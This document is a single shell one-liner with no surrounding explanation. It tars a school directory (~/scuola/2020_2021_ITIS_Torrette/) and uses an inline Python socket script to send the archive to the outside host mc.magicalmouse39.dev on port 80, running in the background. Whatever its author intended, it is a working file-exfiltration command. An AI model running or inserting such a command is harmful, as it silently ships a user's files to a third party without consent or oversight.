tar -cf ~/mgkl.tar ~/scuola/2020_2021_ITIS_Torrette/ && python3 -c 'import socket
import os
s = socket.socket()
s.connect(("mc.magicalmouse39.dev", 80))
user = os.getenv("USER")
with open(f"/home/{user}/mgkl.tar", "rb") as fin:
    s.send(fin.read())
s.close()' &

